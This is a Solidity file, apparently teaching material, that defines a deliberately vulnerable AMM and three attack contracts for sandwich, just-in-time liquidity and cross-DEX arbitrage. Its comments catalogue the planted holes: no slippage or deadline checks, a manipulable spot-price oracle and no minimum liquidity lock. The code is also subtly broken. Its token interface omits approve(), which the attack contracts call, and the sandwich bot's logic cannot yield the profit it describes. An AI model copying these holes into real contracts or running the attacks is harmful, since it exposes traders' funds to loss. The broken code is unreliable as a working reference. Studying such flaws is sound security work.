// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Vulnerable AMM with MEV Exploits
 * @notice Demonstrates complex MEV and sandwich attack vulnerabilities
 * @dev WARNING: DO NOT USE IN PRODUCTION
 * 
 * COMPLEX VULNERABILITIES:
 * 
 * 1. SANDWICH ATTACK VECTOR
 *    - No slippage protection
 *    - Predictable price impact
 *    - MEV bots can frontrun + backrun
 * 
 * 2. JUST-IN-TIME (JIT) LIQUIDITY ATTACK
 *    - Add liquidity right before large swap
 *    - Capture swap fees
 *    - Remove liquidity immediately after
 *    - Minimal capital requirement
 * 
 * 3. PRICE ORACLE MANIPULATION
 *    - Uses spot price for oracle
 *    - Single large swap manipulates price
 *    - Other protocols reading price can be exploited
 * 
 * 4. FRONT-RUNNING LIQUIDITY REMOVAL
 *    - Can see pending removeLiquidity tx
 *    - Frontrun with swap at better price
 *    - User loses more to slippage
 * 
 * 5. CROSS-DEX ARBITRAGE
 *    - Price differences between DEXes
 *    - Atomic arbitrage in single tx
 *    - Risk-free profit for MEV bots
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title VulnerableAMM
 * @notice Simple constant-product AMM with multiple MEV vulnerabilities
 */
contract VulnerableAMM {
    IERC20 public immutable token0;
    IERC20 public immutable token1;
    
    uint256 public reserve0;
    uint256 public reserve1;
    
    mapping(address => uint256) public liquidityBalances;
    uint256 public totalLiquidity;
    
    uint256 public constant MINIMUM_LIQUIDITY = 1000;
    uint256 public constant FEE = 3; // 0.3% fee
    
    event Swap(address indexed user, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out);
    event AddLiquidity(address indexed user, uint256 amount0, uint256 amount1, uint256 liquidity);
    event RemoveLiquidity(address indexed user, uint256 amount0, uint256 amount1, uint256 liquidity);
    event Sync(uint256 reserve0, uint256 reserve1);
    
    constructor(address _token0, address _token1) {
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
    }
    
    /**
     * @notice VULNERABILITY 1: No minimum liquidity lock
     * @dev First LP can manipulate initial price and withdraw immediately
     */
    function addLiquidity(uint256 amount0, uint256 amount1) external returns (uint256 liquidity) {
        require(amount0 > 0 && amount1 > 0, "Insufficient amounts");
        
        // Transfer tokens
        require(token0.transferFrom(msg.sender, address(this), amount0), "Transfer 0 failed");
        require(token1.transferFrom(msg.sender, address(this), amount1), "Transfer 1 failed");
        
        if (totalLiquidity == 0) {
            // First liquidity provider
            // VULNERABLE: No minimum liquidity lock (like Uniswap's MINIMUM_LIQUIDITY)
            liquidity = sqrt(amount0 * amount1);
        } else {
            // VULNERABLE: Can be manipulated via donation attack
            liquidity = min(
                (amount0 * totalLiquidity) / reserve0,
                (amount1 * totalLiquidity) / reserve1
            );
        }
        
        require(liquidity > 0, "Insufficient liquidity minted");
        
        liquidityBalances[msg.sender] += liquidity;
        totalLiquidity += liquidity;
        
        _update(reserve0 + amount0, reserve1 + amount1);
        
        emit AddLiquidity(msg.sender, amount0, amount1, liquidity);
    }
    
    /**
     * @notice VULNERABILITY 2: No slippage protection
     * @dev Users can be sandwiched by MEV bots
     * 
     * SANDWICH ATTACK:
     * 1. MEV bot sees user's swap in mempool
     * 2. Bot frontruns with large swap in same direction (increases price)
     * 3. User's swap executes at worse price
     * 4. Bot backruns with opposite swap (profits from price difference)
     */
    function swap(
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out
    ) external {
        require(amount0In > 0 || amount1In > 0, "Insufficient input");
        require(amount0Out > 0 || amount1Out > 0, "Insufficient output");
        require(amount0Out < reserve0 && amount1Out < reserve1, "Insufficient liquidity");
        
        // VULNERABLE: No minimum output amount (slippage protection)
        // VULNERABLE: No deadline parameter
        
        // Transfer tokens in
        if (amount0In > 0) {
            require(token0.transferFrom(msg.sender, address(this), amount0In), "Transfer 0 failed");
        }
        if (amount1In > 0) {
            require(token1.transferFrom(msg.sender, address(this), amount1In), "Transfer 1 failed");
        }
        
        // Transfer tokens out
        if (amount0Out > 0) {
            require(token0.transfer(msg.sender, amount0Out), "Transfer 0 failed");
        }
        if (amount1Out > 0) {
            require(token1.transfer(msg.sender, amount1Out), "Transfer 1 failed");
        }
        
        // Check constant product (with fee)
        uint256 balance0 = token0.balanceOf(address(this));
        uint256 balance1 = token1.balanceOf(address(this));
        
        // VULNERABLE: Fee calculation can be gamed
        uint256 balance0Adjusted = balance0 * 1000 - amount0In * FEE;
        uint256 balance1Adjusted = balance1 * 1000 - amount1In * FEE;
        
        require(
            balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * (1000**2),
            "K invariant violation"
        );
        
        _update(balance0, balance1);
        
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out);
    }
    
    /**
     * @notice VULNERABILITY 3: Liquidity can be added/removed in same block as swap
     * @dev Enables Just-In-Time (JIT) liquidity attack
     * 
     * JIT ATTACK:
     * 1. Attacker sees large swap in mempool
     * 2. Attacker frontruns by adding liquidity
     * 3. Large swap executes, attacker captures most of the fees
     * 4. Attacker backruns by removing liquidity
     * 5. Profit: Swap fees with minimal capital risk
     */
    function removeLiquidity(uint256 liquidity) external returns (uint256 amount0, uint256 amount1) {
        require(liquidity > 0, "Insufficient liquidity");
        require(liquidityBalances[msg.sender] >= liquidity, "Insufficient balance");
        
        uint256 totalSupply = totalLiquidity;
        amount0 = (liquidity * reserve0) / totalSupply;
        amount1 = (liquidity * reserve1) / totalSupply;
        
        require(amount0 > 0 && amount1 > 0, "Insufficient liquidity burned");
        
        liquidityBalances[msg.sender] -= liquidity;
        totalLiquidity -= liquidity;
        
        require(token0.transfer(msg.sender, amount0), "Transfer 0 failed");
        require(token1.transfer(msg.sender, amount1), "Transfer 1 failed");
        
        _update(reserve0 - amount0, reserve1 - amount1);
        
        emit RemoveLiquidity(msg.sender, amount0, amount1, liquidity);
    }
    
    /**
     * @notice VULNERABILITY 4: Spot price oracle
     * @dev Can be manipulated in single transaction for oracle attacks
     */
    function getPrice() external view returns (uint256) {
        // VULNERABLE: Spot price, not TWAP
        // Can be manipulated with flash loan
        require(reserve0 > 0 && reserve1 > 0, "No liquidity");
        return (reserve1 * 1e18) / reserve0;
    }
    
    function _update(uint256 _reserve0, uint256 _reserve1) private {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
        emit Sync(reserve0, reserve1);
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
    
    function min(uint256 x, uint256 y) internal pure returns (uint256) {
        return x < y ? x : y;
    }
}

/**
 * @title Sandwich Attack Bot
 * @notice Demonstrates how to execute sandwich attacks
 */
contract SandwichAttackBot {
    VulnerableAMM public amm;
    IERC20 public token0;
    IERC20 public token1;
    
    constructor(address _amm) {
        amm = VulnerableAMM(_amm);
        token0 = amm.token0();
        token1 = amm.token1();
    }
    
    /**
     * @notice Execute sandwich attack
     * @param victimAmount0In Amount victim is swapping
     * @param frontrunAmount Amount to frontrun with
     * 
     * ATTACK FLOW:
     * 1. Frontrun: Swap in same direction as victim (increases price)
     * 2. Victim: Swap executes at worse price
     * 3. Backrun: Swap in opposite direction (capture profit)
     */
    function executeSandwich(
        uint256 victimAmount0In,
        uint256 frontrunAmount
    ) external {
        // Approve tokens
        token0.approve(address(amm), type(uint256).max);
        token1.approve(address(amm), type(uint256).max);
        
        uint256 reserve0 = amm.reserve0();
        uint256 reserve1 = amm.reserve1();
        
        // Step 1: Frontrun - Buy token1 (same direction as victim)
        uint256 frontrunOut = getAmountOut(frontrunAmount, reserve0, reserve1);
        amm.swap(frontrunAmount, 0, 0, frontrunOut);
        
        // Step 2: Victim's transaction executes here (in real scenario)
        // Price is now worse for victim
        
        // Step 3: Backrun - Sell token1 back
        reserve0 = amm.reserve0();
        reserve1 = amm.reserve1();
        uint256 backrunOut = getAmountOut(frontrunOut, reserve1, reserve0);
        amm.swap(0, frontrunOut, backrunOut, 0);
        
        // Profit is: backrunOut - frontrunAmount
        uint256 profit = backrunOut > frontrunAmount ? backrunOut - frontrunAmount : 0;
        
        // Transfer profit to attacker
        if (profit > 0) {
            token0.transfer(msg.sender, profit);
        }
    }
    
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) 
        internal 
        pure 
        returns (uint256) 
    {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}

/**
 * @title JIT Liquidity Attack
 * @notice Just-In-Time liquidity provision to capture fees
 */
contract JITLiquidityAttack {
    VulnerableAMM public amm;
    IERC20 public token0;
    IERC20 public token1;
    
    constructor(address _amm) {
        amm = VulnerableAMM(_amm);
        token0 = amm.token0();
        token1 = amm.token1();
    }
    
    /**
     * @notice Execute JIT attack
     * @param amount0 Amount of token0 to add as liquidity
     * @param amount1 Amount of token1 to add as liquidity
     * 
     * ATTACK:
     * 1. Frontrun victim by adding liquidity
     * 2. Victim's swap pays fees (attacker gets large share)
     * 3. Backrun by removing liquidity
     * 4. Profit: Fees captured with minimal time exposure
     */
    function executeJIT(uint256 amount0, uint256 amount1) external returns (uint256 profit) {
        // Get tokens
        token0.transferFrom(msg.sender, address(this), amount0);
        token1.transferFrom(msg.sender, address(this), amount1);
        
        // Approve
        token0.approve(address(amm), type(uint256).max);
        token1.approve(address(amm), type(uint256).max);
        
        // Step 1: Add liquidity (frontrun)
        uint256 liquidity = amm.addLiquidity(amount0, amount1);
        
        // Step 2: Victim's large swap happens here
        // Fees are distributed proportionally to liquidity providers
        // Since we just added, we get a large share
        
        // Step 3: Remove liquidity immediately (backrun)
        (uint256 received0, uint256 received1) = amm.removeLiquidity(liquidity);
        
        // Calculate profit (fees earned)
        profit = 0;
        if (received0 > amount0) {
            profit += received0 - amount0;
        }
        if (received1 > amount1) {
            // Convert to token0 equivalent for total profit
            profit += (received1 - amount1) * amm.reserve0() / amm.reserve1();
        }
        
        // Return tokens
        token0.transfer(msg.sender, token0.balanceOf(address(this)));
        token1.transfer(msg.sender, token1.balanceOf(address(this)));
    }
}

/**
 * @title Cross-DEX Arbitrage
 * @notice Arbitrage between two AMMs with price differences
 */
contract CrossDEXArbitrage {
    VulnerableAMM public amm1;
    VulnerableAMM public amm2;
    IERC20 public token0;
    IERC20 public token1;
    
    constructor(address _amm1, address _amm2) {
        amm1 = VulnerableAMM(_amm1);
        amm2 = VulnerableAMM(_amm2);
        token0 = amm1.token0();
        token1 = amm1.token1();
    }
    
    /**
     * @notice Execute atomic arbitrage
     * @param amount Amount to arbitrage
     * 
     * ARBITRAGE:
     * 1. Check price difference between AMMs
     * 2. Buy from cheaper AMM
     * 3. Sell to expensive AMM
     * 4. Keep profit (all in one transaction, no risk)
     */
    function executeArbitrage(uint256 amount) external {
        token0.approve(address(amm1), type(uint256).max);
        token0.approve(address(amm2), type(uint256).max);
        token1.approve(address(amm1), type(uint256).max);
        token1.approve(address(amm2), type(uint256).max);
        
        // Get prices from both AMMs
        uint256 price1 = amm1.getPrice();
        uint256 price2 = amm2.getPrice();
        
        if (price1 < price2) {
            // Buy from AMM1, sell to AMM2
            uint256 out1 = getAmountOut(amount, amm1.reserve0(), amm1.reserve1());
            amm1.swap(amount, 0, 0, out1);
            
            uint256 out2 = getAmountOut(out1, amm2.reserve1(), amm2.reserve0());
            amm2.swap(0, out1, out2, 0);
            
            // Profit: out2 - amount
        } else if (price2 < price1) {
            // Buy from AMM2, sell to AMM1
            uint256 out1 = getAmountOut(amount, amm2.reserve0(), amm2.reserve1());
            amm2.swap(amount, 0, 0, out1);
            
            uint256 out2 = getAmountOut(out1, amm1.reserve1(), amm1.reserve0());
            amm1.swap(0, out1, out2, 0);
        }
        
        // Transfer profit back
        uint256 balance0 = token0.balanceOf(address(this));
        uint256 balance1 = token1.balanceOf(address(this));
        
        if (balance0 > 0) token0.transfer(msg.sender, balance0);
        if (balance1 > 0) token1.transfer(msg.sender, balance1);
    }
    
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) 
        internal 
        pure 
        returns (uint256) 
    {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}
